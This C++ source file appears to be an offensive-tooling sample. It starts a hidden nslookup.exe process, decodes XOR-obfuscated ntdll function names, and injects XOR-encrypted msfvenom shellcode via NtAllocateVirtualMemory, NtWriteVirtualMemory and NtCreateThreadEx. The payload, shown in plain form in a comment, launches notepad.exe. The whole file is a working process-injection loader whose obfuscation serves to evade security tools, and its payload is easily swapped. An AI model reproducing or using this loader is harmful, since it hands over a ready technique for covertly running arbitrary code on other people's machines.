#include <Windows.h>
#include "inject.h"

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

typedef struct _UNICODE_STRING
{
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _PS_ATTRIBUTE
{
    ULONG  Attribute;
    SIZE_T Size;
    union
    {
        ULONG Value;
        PVOID ValuePtr;
    } u1;
    PSIZE_T ReturnLength;
} PS_ATTRIBUTE, * PPS_ATTRIBUTE;

typedef struct _PS_ATTRIBUTE_LIST
{
    SIZE_T       TotalLength;
    PS_ATTRIBUTE Attributes[1];
} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;

typedef struct _OBJECT_ATTRIBUTES
{
    ULONG           Length;
    HANDLE          RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG           Attributes;
    PVOID           SecurityDescriptor;
    PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

typedef NTSTATUS(WINAPI* NAVM)(HANDLE, PVOID, ULONG, PULONG, ULONG, ULONG);
typedef NTSTATUS(NTAPI* NWVM)(HANDLE, PVOID, PVOID, ULONG, PULONG);
typedef NTSTATUS(NTAPI* NCT)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PPS_ATTRIBUTE_LIST);

//char g_nameNAVM[] = "NtAllocateVirtualMemory";
//char g_nameNWVM[] = "NtWriteVirtualMemory";
//char g_nameNCT[] = "NtCreateThreadEx";

char g_nameDLL[] = { 0x4a,0x50,0x40,0x48,0x48,0xa,0x40,0x48,0x48,0x24 };
char g_nameNAVM[] = { 0x6a,0x50,0x65,0x48,0x48,0x4b,0x47,0x45,0x50,0x41,0x72,0x4d,0x56,0x50,0x51,0x45,0x48,0x69,0x41,0x49,0x4b,0x56,0x5d,0x24 };
char g_nameNWVM[] = { 0x6a,0x50,0x73,0x56,0x4d,0x50,0x41,0x72,0x4d,0x56,0x50,0x51,0x45,0x48,0x69,0x41,0x49,0x4b,0x56,0x5d,0x24 };
char g_nameNCT[] = { 0x6a,0x50,0x67,0x56,0x41,0x45,0x50,0x41,0x70,0x4c,0x56,0x41,0x45,0x40,0x61,0x5c,0x24 };

char* Decrypt(char* s, int len, unsigned char k)
{
    for (int i = 0; i < len; i++)
    {
        s[i] = s[i] ^ k;
    }

    s[len - 1] = 0;

    return s;
}

int Inject(unsigned char k)
{
    // msfvenom -p windows/x64/exec CMD=notepad.exe -f c
//     unsigned char shellcode[] =
//         "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
//         "\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
//         "\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
//         "\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
//         "\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
//         "\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
//         "\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
//         "\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
//         "\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
//         "\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
//         "\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
//         "\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
//         "\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
//         "\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
//         "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
//         "\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"
//         "\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
//         "\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x6e\x6f\x74"
//         "\x65\x70\x61\x64\x2e\x65\x78\x65\x00";

    unsigned char shellcode[] =
        { 0xd8,0x6c,0xa7,0xc0,0xd4,0xcc,0xe4,0x24,0x24,0x24,0x65,0x75,0x65,0x74,0x76,0x75,0x72,0x6c,0x15,0xf6,0x41,0x6c,0xaf,0x76,0x44,0x6c,0xaf,0x76,0x3c,0x6c,0xaf,0x76,0x4,0x6c,0xaf,0x56,0x74,0x6c,0x2b,0x93,0x6e,0x6e,0x69,0x15,0xed,0x6c,0x15,0xe4,0x88,0x18,0x45,0x58,0x26,0x8,0x4,0x65,0xe5,0xed,0x29,0x65,0x25,0xe5,0xc6,0xc9,0x76,0x65,0x75,0x6c,0xaf,0x76,0x4,0xaf,0x66,0x18,0x6c,0x25,0xf4,0xaf,0xa4,0xac,0x24,0x24,0x24,0x6c,0xa1,0xe4,0x50,0x43,0x6c,0x25,0xf4,0x74,0xaf,0x6c,0x3c,0x60,0xaf,0x64,0x4,0x6d,0x25,0xf4,0xc7,0x72,0x6c,0xdb,0xed,0x65,0xaf,0x10,0xac,0x6c,0x25,0xf2,0x69,0x15,0xed,0x6c,0x15,0xe4,0x88,0x65,0xe5,0xed,0x29,0x65,0x25,0xe5,0x1c,0xc4,0x51,0xd5,0x68,0x27,0x68,0x0,0x2c,0x61,0x1d,0xf5,0x51,0xfc,0x7c,0x60,0xaf,0x64,0x0,0x6d,0x25,0xf4,0x42,0x65,0xaf,0x28,0x6c,0x60,0xaf,0x64,0x38,0x6d,0x25,0xf4,0x65,0xaf,0x20,0xac,0x6c,0x25,0xf4,0x65,0x7c,0x65,0x7c,0x7a,0x7d,0x7e,0x65,0x7c,0x65,0x7d,0x65,0x7e,0x6c,0xa7,0xc8,0x4,0x65,0x76,0xdb,0xc4,0x7c,0x65,0x7d,0x7e,0x6c,0xaf,0x36,0xcd,0x73,0xdb,0xdb,0xdb,0x79,0x6c,0x9e,0x25,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x6c,0xa9,0xa9,0x25,0x25,0x24,0x24,0x65,0x9e,0x15,0xaf,0x4b,0xa3,0xdb,0xf1,0x9f,0xd4,0x91,0x86,0x72,0x65,0x9e,0x82,0xb1,0x99,0xb9,0xdb,0xf1,0x6c,0xa7,0xe0,0xc,0x18,0x22,0x58,0x2e,0xa4,0xdf,0xc4,0x51,0x21,0x9f,0x63,0x37,0x56,0x4b,0x4e,0x24,0x7d,0x65,0xad,0xfe,0xdb,0xf1,0x4a,0x4b,0x50,0x41,0x54,0x45,0x40,0xa,0x41,0x5c,0x41,0x24 };

    // Create a 64-bit process: 
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    LPVOID allocation_start;
    SIZE_T allocation_size = sizeof(shellcode);
    LPCWSTR cmd;
    HANDLE hThread;
    NTSTATUS status;

    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);
    cmd = TEXT("C:\\Windows\\System32\\nslookup.exe");

    if (!CreateProcess(
        cmd,							// Executable
        NULL,							// Command line
        NULL,							// Process handle not inheritable
        NULL,							// Thread handle not inheritable
        FALSE,							// Set handle inheritance to FALSE
        CREATE_NO_WINDOW,	            // Do Not Open a Window
        NULL,							// Use parent's environment block
        NULL,							// Use parent's starting directory 
        &si,			                // Pointer to STARTUPINFO structure
        &pi))							// Pointer to PROCESS_INFORMATION structure (removed extra parentheses)
    {
        return Error("[-] Failed CreateProcess().");
    }

    WaitForSingleObject(pi.hProcess, 1000); // Allow nslookup 1 second to start/initialize. 

    // Inject into the 64-bit process:
    // LoadLibary MEDIUM-LEVEL UNDOCUMENTED API:
    HINSTANCE hNtdll = LoadLibraryA(Decrypt(g_nameDLL, sizeof(g_nameDLL), k));
    NAVM NtAllocateVirtualMemory = (NAVM)GetProcAddress(hNtdll, Decrypt(g_nameNAVM, sizeof(g_nameNAVM), k));
    NWVM NtWriteVirtualMemory = (NWVM)GetProcAddress(hNtdll, Decrypt(g_nameNWVM, sizeof(g_nameNWVM), k));
    NCT NtCreateThreadEx = (NCT)GetProcAddress(hNtdll, Decrypt(g_nameNCT, sizeof(g_nameNCT), k));
    allocation_start = nullptr;

    status = NtAllocateVirtualMemory(pi.hProcess, &allocation_start, 0, (PULONG)&allocation_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!NT_SUCCESS(status))
        return Error("[-] Failed NtAllocateVirtualMemory.");

    Decrypt((char *)shellcode, sizeof(shellcode), k);
    status = NtWriteVirtualMemory(pi.hProcess, allocation_start, shellcode, sizeof(shellcode), 0);
    if (!NT_SUCCESS(status))
        return Error("[-] Failed NtWriteVirtualMemory.");

    status = NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, pi.hProcess, allocation_start, allocation_start, FALSE, NULL, NULL, NULL, NULL);
    if (!NT_SUCCESS(status))
        return Error("[-] Failed NtCreateThreadEx.");

    return 0;
}